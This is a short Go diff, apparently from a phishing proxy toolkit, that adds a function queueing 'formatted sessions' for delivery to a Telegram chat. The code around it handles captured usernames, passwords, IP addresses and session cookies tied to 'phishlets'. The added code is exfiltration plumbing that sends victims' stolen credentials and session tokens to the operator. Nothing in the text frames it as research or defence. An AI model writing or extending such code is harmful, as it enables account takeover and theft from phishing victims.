@@ -146,6 +146,26 @@ func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, use
 	}
 }
 
+// SendFormattedSession sends a formatted session using the custom format
+func (t *TelegramBot) SendFormattedSession(sessionID int, formattedMessage string) {
+	if !t.enabled || t.botToken == "" || t.chatID == "" {
+		return
+	}
+
+	msg := &TelegramMessage{
+		ChatID:    t.chatID,
+		Text:      formattedMessage,
+		ParseMode: "",  // No markdown parsing for custom format
+	}
+
+	select {
+	case t.msgQueue <- msg:
+		log.Success("[%d] formatted session queued for telegram", sessionID)
+	default:
+		log.Warning("telegram: message queue is full, dropping formatted session")
+	}
+}
+
 func (t *TelegramBot) SendTokensCapture(sessionID int, username, password, ip, domain string, phishletName string, cookieCount int) {
 	if !t.enabled || t.botToken == "" || t.chatID == "" {
 		return
